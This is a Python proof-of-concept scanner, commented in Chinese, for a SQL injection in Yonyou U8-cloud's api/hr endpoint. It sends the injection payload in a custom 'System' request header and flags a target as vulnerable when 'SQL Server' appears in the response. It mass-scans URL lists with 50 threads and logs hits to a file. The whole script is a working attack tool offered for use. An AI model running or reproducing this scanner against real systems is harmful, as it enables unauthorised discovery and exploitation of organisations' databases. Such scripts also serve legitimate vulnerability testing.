# 用友 U8-cloud api_hr sql注入漏洞
import argparse,sys,requests,re,requests_raw
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗   ██╗ █████╗        ██████╗██╗      ██████╗ ██╗   ██╗██████╗      █████╗ ██████╗ ██╗        ██╗  ██╗██████╗ 
██║   ██║██╔══██╗      ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗    ██╔══██╗██╔══██╗██║        ██║  ██║██╔══██╗
██║   ██║╚█████╔╝█████╗██║     ██║     ██║   ██║██║   ██║██║  ██║    ███████║██████╔╝██║        ███████║██████╔╝
██║   ██║██╔══██╗╚════╝██║     ██║     ██║   ██║██║   ██║██║  ██║    ██╔══██║██╔═══╝ ██║        ██╔══██║██╔══██╗
╚██████╔╝╚█████╔╝      ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝    ██║  ██║██║     ██║███████╗██║  ██║██║  ██║
 ╚═════╝  ╚════╝        ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友 U8-cloud api_hr sql注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/u8cloud/api/hr'
    url = target+payload
    headers = {"User-Agent": "ozilla/5.0(X11; U;Linux x86_64; zh-CN; rv:1.9.2.10)Gecko/20100922Ubuntu/10.10(maverick)Firefox/3.6.10", "Cache-Control": "o-cache", "Connection": "keep-alive", "Pragma": "o-cache", "System": "1' or 1=(@@version)--+-", "Upgrade-Insecure-Requests": "1", "Accept-Encoding": "gzip, deflate, br"}    #请求网页
    try:
        res1 = requests.get(url=url,headers=headers,verify=False)
        if res1.status_code == 200 and 'SQL Server' in res1.text: 
            print(f'[+++]该{target}存在漏洞')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
            return True
        else:
            print(f'该{target}不存在该漏洞')
        return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()